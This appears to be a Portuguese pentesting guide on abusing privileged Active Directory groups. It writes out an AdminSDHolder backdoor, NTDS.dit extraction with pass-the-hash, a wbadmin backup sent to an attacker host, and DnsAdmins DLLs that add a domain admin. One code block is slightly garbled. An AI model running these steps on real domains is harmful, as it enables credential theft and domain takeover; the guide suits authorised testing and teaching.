# Grupos privilegiados

{{#include ../../banners/hacktricks-training.md}}

## Grupos conhecidos com privilégios de administração

- **Administrators**
- **Domain Admins**
- **Enterprise Admins**

## Account Operators

Este grupo tem permissão para criar contas e grupos que não sejam de administradores no domínio. Além disso, permite o login local no Controlador de Domínio (DC).

Para identificar os membros deste grupo, execute o seguinte comando:

```bash
Get-NetGroupMember -Identity "Account Operators" -Recurse
```

A adição de novos usuários é permitida, assim como o login local no DC.<sup>[[1]](#references)</sup>

Um caminho condicional do gerenciamento de contas ao acesso de administrador local é um **grupo comum delegado para ler a senha LAPS de um computador**. Verifique os direitos efetivos de gravação de associação nesse grupo específico, se ele é protegido e se uma conta nova ou controlada pode realmente ingressar nele. Atualize o token da conta antes de testar a permissão de leitura LAPS do computador de destino. No Windows LAPS criptografado, a permissão de leitura no diretório e a autoridade para descriptografar a senha são requisitos distintos; a associação ao grupo ou a associação a Account Operators, por si só, não garante nenhum dos dois. Consulte [o escopo de Account Operators da Microsoft](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups) e [a delegação do Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-scenarios-windows-server-active-directory).

## Grupo AdminSDHolder

A Access Control List (ACL) do grupo **AdminSDHolder** é crucial, pois define as permissões de todos os "grupos protegidos" no Active Directory, incluindo grupos de alto privilégio. Esse mecanismo garante a segurança desses grupos, impedindo modificações não autorizadas.

Um atacante poderia explorar isso modificando a ACL do grupo **AdminSDHolder** e concedendo permissões totais a um usuário comum. Isso efetivamente daria a esse usuário controle total sobre todos os grupos protegidos. Se as permissões desse usuário fossem alteradas ou removidas, elas seriam restauradas automaticamente em uma hora, devido ao projeto do sistema.<sup>[[14]](#references)</sup>

A documentação recente do Windows Server ainda classifica vários grupos de operadores integrados como objetos **protegidos** (`Account Operators`, `Backup Operators`, `Print Operators`, `Server Operators`, `Domain Admins`, `Enterprise Admins`, `Key Admins`, `Enterprise Key Admins` etc.). O processo **SDProp** é executado no **PDC Emulator** por padrão a cada 60 minutos, define `adminCount=1` e desativa a herança nos objetos protegidos. Isso é útil tanto para persistência quanto para localizar usuários privilegiados obsoletos que foram removidos de um grupo protegido, mas ainda mantêm a ACL sem herança.<sup>[[12]](#references)</sup>

Os comandos para revisar os membros e modificar as permissões incluem:

```bash
Get-NetGroupMember -Identity "AdminSDHolder" -Recurse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
Get-ObjectAcl -SamAccountName "Domain Admins" -ResolveGUIDs | ?{$_.IdentityReference -match 'spotless'}
```

```powershell
# Hunt users/groups that still have adminCount=1
Get-ADObject -LDAPFilter '(adminCount=1)' -Properties adminCount,distinguishedName |
  Select-Object distinguishedName
```

Um script está disponível para agilizar o processo de restauração: [Invoke-ADSDPropagation.ps1](https://github.com/edemilliere/ADSI/blob/master/Invoke-ADSDPropagation.ps1).

Para mais detalhes, visite [ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence).<sup>[[14]](#references)</sup>

## AD Recycle Bin

A visibilidade de objetos excluídos é controlada pelas permissões efetivas do diretório; o nome de um grupo, por si só, não prova que a identidade atual pode listar ou restaurar um objeto. O AD Recycle Bin deve ter sido habilitado antes da exclusão para permitir a restauração completa, e a restauração também exige Reanimate-Tombstones na raiz do contexto de nomenclatura, direitos de renomeação e CREATE_CHILD no contêiner de destino. As orientações da [Microsoft sobre o Recycle Bin](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) e as [regras de autorização para undelete](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004) distinguem essas condições. Uma identidade autorizada com acesso de leitura a objetos excluídos pode inspecionar registros que talvez revelem informações confidenciais:

```bash
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```

Isso é útil para **recuperar caminhos anteriores de privilégios**. Objetos excluídos ainda podem expor `lastKnownParent`, `memberOf`, `sIDHistory`, `adminCount`, SPNs antigos ou o DN de um grupo privilegiado excluído que outro operador pode restaurar posteriormente.

Atributos definidos pela aplicação também podem reter material de credenciais antigo enquanto um objeto permanece no estado excluído. Trate isso como uma pista de investigação separada: a identidade atual deve ter permissão para enumerar o objeto excluído **e** ler esse atributo, o valor deve ser uma credencial utilizável e um principal ainda ativo deve aceitá-la. A associação a um grupo ou apenas o nome de uma conta excluída não comprova nenhuma dessas etapas; evite imprimir valores de credenciais durante a enumeração de rotina. A [documentação da Microsoft sobre a Reciclagem](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/adac/active-directory-recycle-bin) descreve a preservação de atributos após a exclusão.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects `
  -Properties samAccountName,lastKnownParent,memberOf,sIDHistory,adminCount,servicePrincipalName |
  Select-Object samAccountName,lastKnownParent,adminCount,sIDHistory,servicePrincipalName
```

### Reanimando uma conta excluída por meio de ACLs delegadas

Um resultado `WRITE` de uma ferramenta de ACL para uma conta excluída é uma pista, não uma prova de que todas as permissões de undelete sejam efetivas.<sup>[[18]](#references)</sup> Inspecione diretamente a ACL do objeto excluído e `lastKnownParent`; os caminhos do BloodHound podem omitir ACLs de objetos excluídos.<sup>[[19]](#references)</sup> Uma conta restaurada pode manter seu hash de senha, mas restaurá-la não revela a senha nem concede direitos de redefinição de senha. A autenticação ainda exige uma credencial válida.<sup>[[19]](#references)</sup>

Para enumerar contas excluídas ocultas e confirmar o direito de reanimação no Linux, use `bloodyAD` com os controles LDAP de objeto reciclado e link desativado. Em seguida, restaure a conta escolhida usando seu `sAMAccountName`. Substitua o domínio, o host e a identidade do exemplo pelos do ambiente avaliado; verifique o DN de destino e `lastKnownParent` antes de gravar.<sup>[[19]](#references)</sup>

```bash
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get writable
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get object 'DC=example,DC=local' --attr nTSecurityDescriptor --resolve-sd | grep -i Reanimate-Tombstones
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' get search -c 1.2.840.113556.1.4.2064 -c 1.2.840.113556.1.4.2065 --base 'CN=Deleted Objects,DC=example,DC=local' --filter '(sAMAccountName=*)' --attr sAMAccountName,lastKnownParent,objectSid
bloodyAD --host dc.example.local -d example.local -u operator -p 'PASSWORD' set restore target.user
```

### Acesso ao Controlador de Domínio

O acesso aos arquivos no DC é restrito, a menos que o usuário faça parte do grupo `Server Operators`, o que altera o nível de acesso.

### Privilege Escalation

Usando `PsService` ou `sc` do Sysinternals, é possível inspecionar e modificar as permissões de serviços. O grupo `Server Operators`, por exemplo, tem controle total sobre determinados serviços, permitindo a execução de comandos arbitrários e a escalada de privilégios:<sup>[[1]](#references)</sup>

```cmd
C:\> .\PsService.exe security AppReadiness
```

Este comando revela que `Server Operators` têm acesso total, permitindo manipular serviços para obter privilégios elevados.

## Backup Operators

A associação a `Backup Operators` pode conceder `SeBackupPrivilege` e `SeRestorePrivilege` em um host, dependendo da política local e da sessão de logon. Verifique o **token efetivo do processo que executa os comandos** com `whoami /groups` e `whoami /priv`: a associação, por si só, não prova que `SeBackupPrivilege` esteja presente e habilitado. Se o privilégio estiver presente, mas desabilitado, ele poderá ser habilitado nesse token; se estiver ausente ou tiver sido removido, essas operações de backup não poderão usá-lo. `SeBackupPrivilege` permite **leituras** de dados protegidos por meio de APIs compatíveis com backup (por exemplo, `FILE_FLAG_BACKUP_SEMANTICS` ou `robocopy /B`); `SeRestorePrivilege` é um privilégio separado para operações de restauração/gravação. Listagens comuns de diretórios e cópias não usam necessariamente a semântica de backup.<sup>[[1]](#references)</sup>

Para listar os membros do grupo, execute:

```bash
Get-NetGroupMember -Identity "Backup Operators" -Recurse
```

### Ataque Local

Em um host no qual o token efetivo tem `SeBackupPrivilege`, a cópia compatível com backup a seguir pode ler um arquivo protegido:

1. Importe as bibliotecas necessárias:

```bash
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. Se o privilégio estiver presente, mas desativado, habilite-o e verifique seu estado neste processo:

```bash
Set-SeBackupPrivilege
Get-SeBackupPrivilege
```

3. Copie um arquivo de um diretório restrito, por exemplo:

```bash
dir C:\Users\Administrator\
Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Overwrite
```

### AD Attack

`NTDS.dit` é o banco de dados do Active Directory em um **controlador de domínio (DC)**. Esse método exige um token adequado no DC e acesso ao volume que contém o banco de dados; ser membro de Backup Operators em outro local não concede acesso a um DC específico. Um banco de dados em uso normalmente está bloqueado, então use uma cópia de sombra acessível ou outro recurso de backup antes de copiá-lo. A criação ou exposição de uma cópia de sombra também depende da configuração de VSS do host e dos direitos de quem faz a solicitação. O exemplo abaixo pressupõe que o DC armazena `NTDS.dit` em `C:`, em `\Windows\NTDS`; ajuste o volume e o caminho se não for o caso.

#### Usando diskshadow.exe

1. Se permitido, crie e exponha uma cópia de sombra da unidade `C:` do DC como `F:`:

```cmd
diskshadow.exe
set verbose on
set metadata C:\Windows\Temp\meta.cab
set context clientaccessible
begin backup
add volume C: alias cdrive
create
expose %cdrive% F:
end backup
exit
```

2. Copie `NTDS.dit` da cópia de sombra:

```cmd
mkdir C:\Tools
Copy-FileSeBackupPrivilege F:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
```

Alternativamente, use `robocopy` para copiar arquivos:

```cmd
robocopy /B F:\Windows\NTDS C:\Tools ntds.dit
```

3. Salve o hive `SYSTEM` do DC para extração offline. `SAM` é o banco de dados de contas locais em sistemas membros; o hive `SAM` de um DC não substitui `NTDS.dit` nem é uma fonte do hash do Administrator do domínio:

```cmd
reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
```

4. Transfira `ntds.dit` e `SYSTEM.SAV` para o host de análise e extraia os hashes das contas do domínio. Um hive `SAM` salvo de um sistema membro, junto com o hive `SYSTEM` correspondente, fornece hashes de contas locais:

```shell-session
secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
```

5. Se um hash de Administrator do **domínio** foi recuperado de `NTDS.dit`, ele pode ser testado para autenticação no domínio. Um hash de Administrator local de `SAM.SAV` é uma credencial diferente e não autentica como Administrator do domínio.<sup>[[11]](#references)</sup>

```bash
# Use the recovered domain Administrator NT hash to authenticate without the cleartext password
netexec winrm <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"

# Or execute via SMB using an exec method
netexec smb <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
```

#### Usando wbadmin.exe

1. Configure um sistema de arquivos NTFS para o servidor SMB na máquina do atacante e armazene em cache as credenciais SMB na máquina-alvo.
2. Use `wbadmin.exe` para fazer backup do sistema e extrair o `NTDS.dit`:
   ```cmd
   net use X: \\<AttackIP>\sharename /user:smbuser password
   echo "Y" | wbadmin start backup -backuptarget:\\<AttackIP>\sharename -include:c:\windows\ntds
   wbadmin get versions
   echo "Y" | wbadmin start recovery -version:<date-time> -itemtype:file -items:c:\windows\ntds\ntds.dit -recoverytarget:C:\ -notrestoreacl
   ```

Para uma demonstração prática, veja [VÍDEO DE DEMONSTRAÇÃO COM IPPSEC](https://www.youtube.com/watch?v=IfCysW0Od8w&t=2610s).

## DnsAdmins

Os membros do grupo **DnsAdmins** podem explorar seus privilégios para carregar uma DLL arbitrária com privilégios de SYSTEM em um servidor DNS, geralmente hospedado em Controladores de Domínio. Essa capacidade oferece um potencial significativo de exploração.

Para listar os membros do grupo DnsAdmins, use:

```bash
Get-NetGroupMember -Identity "DnsAdmins" -Recurse
```

### Executar uma DLL arbitrária (CVE‑2021‑40469)

> [!NOTE]
> Esta vulnerabilidade permite a execução de código arbitrário com privilégios SYSTEM no serviço DNS (geralmente nos DCs). Esse problema foi corrigido em 2021.

Os membros podem fazer o servidor DNS carregar uma DLL arbitrária (localmente ou de um compartilhamento remoto) usando comandos como:

```bash
dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
dnscmd [dc.computername] /config /serverlevelplugindll \\1.2.3.4\share\DNSAdmin-DLL.dll
An attacker could modify the DLL to add a user to the Domain Admins group or execute other commands with SYSTEM privileges. Example DLL modification and msfvenom usage:

# If dnscmd is not installed run from aprivileged PowerShell session:
Install-WindowsFeature -Name RSAT-DNS-Server -IncludeManagementTools
```

```c
// Modify DLL to add user
DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunction)
{
    system("C:\\Windows\\System32\\net.exe user Hacker T0T4llyrAndOm... /add /domain");
    system("C:\\Windows\\System32\\net.exe group \"Domain Admins\" Hacker /add /domain");
}
```

```bash
// Generate DLL with msfvenom
msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
```

Reiniciar o serviço DNS (o que pode exigir permissões adicionais) é necessário para que a DLL seja carregada:

```csharp
sc.exe \\dc01 stop dns
sc.exe \\dc01 start dns
```

Para mais detalhes sobre esse vetor de ataque, consulte ired.team.

#### Mimilib.dll

Também é possível usar mimilib.dll para execução de comandos, modificando-o para executar comandos específicos ou reverse shells. [Confira esta publicação](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html) para mais informações.<sup>[[15]](#references)</sup>

### WPAD Record for MitM

DnsAdmins pode manipular registros DNS para realizar ataques Man-in-the-Middle (MitM), criando um registro WPAD após desativar a lista global de bloqueio de consultas. Ferramentas como Responder ou Inveigh podem ser usadas para falsificar e capturar o tráfego de rede.

### Event Log Readers
Os membros podem acessar os logs de eventos e, potencialmente, encontrar informações confidenciais, como senhas em texto simples ou detalhes de execução de comandos:

```bash
# Get members and search logs for sensitive information
Get-NetGroupMember -Identity "Event Log Readers" -Recurse
Get-WinEvent -LogName security | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'}
```

## Permissões do Exchange Windows

Esse grupo pode modificar DACLs no objeto do domínio, potencialmente concedendo privilégios de DCSync. As técnicas de escalonamento de privilégios que exploram esse grupo estão detalhadas no repositório Exchange-AD-Privesc no GitHub.

```bash
# List members
Get-NetGroupMember -Identity "Exchange Windows Permissions" -Recurse
```

Se você puder atuar como membro deste grupo, o abuso clássico consiste em conceder a um principal controlado pelo atacante os direitos de replicação necessários para [DCSync](dcsync.md):

```bash
Add-DomainObjectAcl -TargetIdentity "DC=testlab,DC=local" -PrincipalIdentity attacker -Rights DCSync
Get-ObjectAcl -DistinguishedName "DC=testlab,DC=local" -ResolveGUIDs | ?{$_.IdentityReference -match 'attacker'}
```

Historicamente, **PrivExchange** encadeava acesso à mailbox, coerção da autenticação do Exchange e relay de LDAP para chegar a essa mesma primitiva. Mesmo quando esse caminho de relay é mitigado, a associação direta ao grupo `Exchange Windows Permissions` ou o controle de um servidor Exchange continua sendo uma rota de alto valor para obter direitos de replicação do domínio.

## Hyper-V Administrators

Os membros de Hyper-V Administrators têm acesso total ao Hyper-V, que pode ser explorado para obter controle sobre Domain Controllers virtualizados. Isso inclui clonar DCs ativos e extrair hashes NTLM do arquivo NTDS.dit.

### Exemplo de exploração

Na prática, o abuso costuma envolver **acesso offline aos discos ou checkpoints dos DCs**, em vez dos antigos truques de LPE no nível do host. Com acesso ao host Hyper-V, um operador pode criar um checkpoint ou exportar um Domain Controller virtualizado, montar o VHDX e extrair `NTDS.dit`, `SYSTEM` e outros segredos sem tocar no LSASS dentro da máquina virtual:

```bash
# Host-side enumeration
Get-VM
Get-VHD -VMId <vm-guid>

# After exporting or checkpointing the DC, mount the disk read-only
Mount-VHD -Path 'C:\HyperV\Virtual Hard Disks\DC01.vhdx' -ReadOnly
```

From daí, reutilize o workflow de `Backup Operators` para copiar `Windows\NTDS\ntds.dit` e os hives do registro offline. Workflow relacionado a arquivos de backup:

{{#ref}}
../../network-services-pentesting/pentesting-veeam-backup-and-replication.md
{{#endref}}

## Group Policy Creators Owners	

Esse grupo permite que os membros criem Group Policies no domínio. No entanto, seus membros não podem aplicar Group Policies a usuários ou grupos, nem editar GPOs existentes.

A nuance importante é que o **criador se torna proprietário da nova GPO** e geralmente obtém direitos suficientes para editá-la depois. Isso significa que esse grupo é interessante quando você pode:

- criar uma GPO maliciosa e convencer um administrador a vinculá-la a uma OU/domínio de destino
- editar uma GPO que você criou e que já esteja vinculada em algum lugar útil
- abusar de outro direito delegado que permita vincular GPOs, enquanto esse grupo fornece os direitos de edição

Na prática, o abuso normalmente envolve adicionar uma **Immediate Task**, um **script de inicialização**, uma alteração de **membros do grupo de administradores locais** ou uma alteração de **atribuição de direitos de usuário** por meio de arquivos de política armazenados no SYSVOL.<sup>[[3]](#references)[[4]](#references)[[13]](#references)[[16]](#references)</sup>

```bash
# Example with SharpGPOAbuse: add an immediate task that executes as SYSTEM
SharpGPOAbuse.exe --AddImmediateTask --TaskName "HT-Task" --Author TESTLAB\\Administrator --Command "cmd.exe" --Arguments "/c whoami > C:\\Windows\\Temp\\gpo.txt" --GPOName "Security Update"
```

Se editar o GPO manualmente por meio de `SYSVOL`, lembre-se de que a alteração, por si só, não é suficiente: também é preciso atualizar `versionNumber`, `GPT.ini` e, às vezes, `gPCMachineExtensionNames`; caso contrário, os clientes ignorarão a atualização da política.<sup>[[9]](#references)</sup>

## Gerenciamento da Organização

Em ambientes nos quais o **Microsoft Exchange** está implantado, um grupo especial chamado **Organization Management** possui recursos significativos. Esse grupo tem privilégios para **acessar as caixas de correio de todos os usuários do domínio** e mantém **controle total sobre a Organizational Unit (OU) 'Microsoft Exchange Security Groups'**. Esse controle inclui o grupo **`Exchange Windows Permissions`**, que pode ser explorado para escalonamento de privilégios.

### Exploração de Privilégios e Comandos

#### Print Operators

Os membros do grupo **Print Operators** possuem vários privilégios, incluindo **`SeLoadDriverPrivilege`**, que permite **fazer logon localmente em um Domain Controller**, desligá-lo e gerenciar impressoras. Para explorar esses privilégios, especialmente se **`SeLoadDriverPrivilege`** não estiver visível em um contexto sem elevação, é necessário contornar o User Account Control (UAC).<sup>[[1]](#references)</sup>

Para listar os membros desse grupo, usa-se o seguinte comando do PowerShell:

```bash
Get-NetGroupMember -Identity "Print Operators" -Recurse
```

Nos Controladores de Domínio, esse grupo é perigoso porque a política padrão dos Controladores de Domínio concede **`SeLoadDriverPrivilege`** a `Print Operators`. Se você obtiver um token elevado de um membro desse grupo, poderá habilitar o privilégio e carregar um driver assinado, mas vulnerável, para alcançar o kernel/SYSTEM.<sup>[[2]](#references)[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)[[17]](#references)</sup> Para detalhes sobre o gerenciamento de tokens, consulte [Access Tokens](../windows-local-privilege-escalation/access-tokens.md).

#### Remote Desktop Users

Os membros desse grupo recebem acesso a PCs via Remote Desktop Protocol (RDP). Para enumerar esses membros, há comandos do PowerShell disponíveis:

```bash
Get-NetGroupMember -Identity "Remote Desktop Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Desktop Users"
```

Further insights into exploiting RDP can be found in dedicated pentesting resources.

#### Remote Management Users

Os membros podem acessar PCs por meio do **Windows Remote Management (WinRM)**. A enumeração desses membros é feita por meio de:

```bash
Get-NetGroupMember -Identity "Remote Management Users" -Recurse
Get-NetLocalGroupMember -ComputerName <pc name> -GroupName "Remote Management Users"
```

Para técnicas de exploração relacionadas ao **WinRM**, consulte a documentação específica.

#### Server Operators

Esse grupo tem permissões para realizar várias configurações em Controladores de Domínio, incluindo privilégios de backup e restauração, alteração da hora do sistema e desligamento do sistema.<sup>[[1]](#references)</sup> Para enumerar os membros, o comando fornecido é:

```bash
Get-NetGroupMember -Identity "Server Operators" -Recurse
```

Nos Domain Controllers, `Server Operators` geralmente herdam direitos suficientes para **reconfigurar ou iniciar/parar serviços** e também recebem `SeBackupPrivilege`/`SeRestorePrivilege` por meio da política padrão do DC. Na prática, isso os torna uma ponte entre o **abuso do controle de serviços** e a **extração do NTDS**:

```cmd
sc.exe \\dc01 query
sc.exe \\dc01 qc <service>
.\PsService.exe security <service>
```

A falha ao listar serviços não descarta o acesso a um **serviço conhecido**. O Service Control Manager verifica `SC_MANAGER_ENUMERATE_SERVICE` separadamente de `SC_MANAGER_CONNECT` para a listagem; abrir um serviço pelo nome verifica os direitos próprios dele, incluindo `SERVICE_CHANGE_CONFIG` e `SERVICE_START`. Revise o token efetivo e a ACL desse serviço mesmo quando um `sc.exe query` geral falhar. Ter apenas direitos de configuração indica somente uma possibilidade: a identidade do serviço, os direitos de iniciar/parar e um gatilho utilizável ainda determinam se uma transição para privilégios mais altos é possível. Consulte a [referência da Microsoft sobre direitos de acesso a serviços](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights).

Se uma ACL de serviço conceder a este grupo direitos de alteração/inicialização, aponte o serviço para um comando arbitrário, inicie-o como `LocalSystem` e, em seguida, restaure o `binPath` original. Se o controle do serviço estiver bloqueado, recorra às técnicas de `Backup Operators` acima para copiar `NTDS.dit`.

## References

- [1] [ired.team – Contas privilegiadas e privilégios de token](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/privileged-accounts-and-token-privileges)
- [2] [Tarlogic – Explorando SeLoadDriverPrivilege para escalonamento de privilégios](https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/)
- [3] [harmj0y – Explorando permissões de GPO](https://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [4] [rastamouse – Abuso de GPO, Parte 1 (Internet Archive)](https://web.archive.org/web/20190416075109/https://rastamouse.me/2019/01/gpo-abuse-part-1/)
- [5] [killswitch-GUI – HotLoad-Driver (ntloaddriver.cpp)](https://github.com/killswitch-GUI/HotLoad-Driver/blob/master/NtLoadDriver/EXE/NtLoadDriver-C%2B%2B/ntloaddriver.cpp#L13)
- [6] [tandasat – ExploitCapcom](https://github.com/tandasat/ExploitCapcom)
- [7] [TarlogicSecurity – EoPLoadDriver (eoploaddriver.cpp)](https://github.com/TarlogicSecurity/EoPLoadDriver/blob/master/eoploaddriver.cpp)
- [8] [FuzzySecurity – Capcom-Rootkit (Capcom.sys)](https://github.com/FuzzySecurity/Capcom-Rootkit/blob/master/Driver/Capcom.sys)
- [9] [SpecterOps – Um guia de Red Team para GPOs e OUs](https://posts.specterops.io/a-red-teamers-guide-to-gpos-and-ous-f0d03976a31e)
- [10] [Microsoft Learn – Função ZwLoadDriver](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwloaddriver)
- [11] [HTB: Baby — LDAP anônimo → password spray → SeBackupPrivilege → Administrador do domínio](https://0xdf.gitlab.io/2025/09/19/htb-baby.html)
- [12] [Microsoft Learn – Apêndice C: Contas e grupos protegidos no Active Directory](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/appendix-c--protected-accounts-and-groups-in-active-directory)
- [13] [WithSecure Labs – SharpGPOAbuse](https://labs.withsecure.com/tools/sharpgpoabuse)
- [14] [ired.team – Como explorar e criar um backdoor no AdminSDHolder para obter persistência como administrador do domínio](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/how-to-abuse-and-backdoor-adminsdholder-to-obtain-domain-admin-persistence)
- [15] [Lab of a Penetration Tester – Explorando o privilégio DnsAdmins para escalonamento no Active Directory](https://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html)
- [16] [BloodHound – Informações sobre abuso da aresta GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all)
- [17] [Undocumented NT Internals – Função NtLoadDriver (Internet Archive)](https://web.archive.org/web/20200313000124/http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FExecutable%20Images%2FNtLoadDriver.html)
- [18] [MS-ADTS - Regras de autorização para exclusão lógica](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/c7279698-8aed-4e0b-b750-97c29f11b004)
- [19] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../banners/hacktricks-training.md}}
